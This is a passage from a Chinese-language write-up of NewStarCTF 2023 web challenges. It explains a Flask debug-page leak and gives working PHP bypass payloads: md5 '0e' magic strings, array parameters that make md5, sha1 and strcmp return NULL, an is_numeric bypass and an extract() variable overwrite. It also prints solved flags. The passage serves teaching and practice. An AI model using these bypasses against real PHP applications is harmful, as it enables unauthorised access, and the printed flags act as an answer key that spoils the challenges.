punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/style.css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/style.css<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token selector\">body</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #16a085<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span> hidden<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token selector\">canvas</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> -1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/jquery.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/verificationNumbers.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/verificationNumbers.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/Particleground.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">tppabs</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js/Particleground.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">$</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">ready</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">particleground</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token literal-property property\">dotColor</span><span class=\"token operator\">:</span> <span class=\"token string\">'#5cbdaa'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token literal-property property\">lineColor</span><span class=\"token operator\">:</span> <span class=\"token string\">'#5cbdaa'</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>ß</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dl</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>admin_login<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dt</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>font</span> <span class=\"token attr-name\">color</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>white<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>strong</span><span class=\"token punctuation\">></span></span>Welcome to NewStarCTF 2023~<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>strong</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>font</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dt</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>font</span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>4px<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">color</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>white<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>恭喜你顺利完成了本道题目，这是你的Flag，快去提交吧：flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>font</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dl</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>&#123;&#125;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>&#123;'Connection': 'close', 'Content-Length': '666', 'Content-Encoding': 'gzip', 'Content-Type': 'text/html; charset=UTF-8', 'Date': 'Wed, 04 Oct 2023 01:58:05 GMT', 'Server': 'Apache/2.4.38 (Debian)', 'Vary': 'Accept-Encoding', 'X-Powered-By': 'PHP/7.3.15'&#125;</pre></td></tr></table></figure><h3 id=\"errorflask\"><a class=\"markdownIt-Anchor\" href=\"#errorflask\">#</a> ErrorFlask</h3>\n<p><strong>考点：Flask 报错界面信息泄露</strong></p>\n<p>题目如下所示：</p>\n<p><img data-src=\"image-20231004100749405.png\" alt=\"image-20231004100749405\"></p>\n<p>它说我们只用给出 number1 和 number2，它会帮我们添加，于是：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//69dd29c8-0844-4ff3-aaef-ec632f65b4bc.node4.buuoj.cn:81/?number1=ab&amp;number2=2</span></span></pre></td></tr></table></figure><p><img data-src=\"image-20231004101424500.png\" alt=\"image-20231004101424500\"></p>\n<p>从中进行查找可以查看到 flag：</p>\n<p><img data-src=\"image-20231004101624946.png\" alt=\"image-20231004101624946\"></p>\n<p><code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p>\n<h3 id=\"begin-of-php\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-php\">#</a> Begin of PHP</h3>\n<p><strong>考点：PHP 弱类型、PHP 加密函数数组绕过、PHP 函数特性、变量覆盖漏洞</strong></p>\n<p><img data-src=\"image-20231004103006040.png\" alt=\"image-20231004103006040\"></p>\n<p>本题一共分出了五个部分。</p>\n<p>第一个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 1=&lt;br>\"</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>        </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$flag1</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 PHP 中 md5 弱类型比较的特点，只需要找到两个值不同但 md5 值以 0e 开头的字符串即可通过本关，原理是 0e 在进行弱类型比较时会被当作科学计数法进行比较，也就是 0。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a</span></span></pre></td></tr></table></figure><p>第二个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 2=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag2</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 PHP 哈希函数的特性，在处理数组类型的传参时，md5、sha1 等哈希函数会返回 NULL 值，由此可以构造出 NULL===NULL 从而通过判断。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span>：key3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><p>第三个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 3=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag3</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 strcmp 函数特性，如果传入的参数为数组类型，该函数就会返回 NULL 值，构造 NULL==0 从而通过判断。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1</span></span></pre></td></tr></table></figure><p>第四个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 4=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">2023</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag4</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 is_numeric 函数特性，在传入的数字后加入任意字母或 %00 即可通过本层的判断。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span></span></pre></td></tr></table></figure><p>第五个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 5=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>考察 extract 函数导致的变量覆盖漏洞，这里的 if 判断只要保证传入变量 flag5 即可，根据上面的正则限制，变量值不能为字母和数字，那么可以传一个 <code>![]</code>  进去，[] 空数组会隐式转换为 false，在！取反得到我们要的 true，(或者，传入一个任意符号也可通过本层。)</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>key3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>flag5<span class=\"token operator\">=</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>得到 flag :  <code>flag&#123;8b247b57-901a-48d6-91d3-8df4b50f3803&#125;</code></p>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> R!C!E!</h3>\n<p><strong>考点：md5 碰撞、PHP 特殊符号传参、PHP 命令执行、黑名单绕过</strong></p>\n<p>题目如下所示：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string 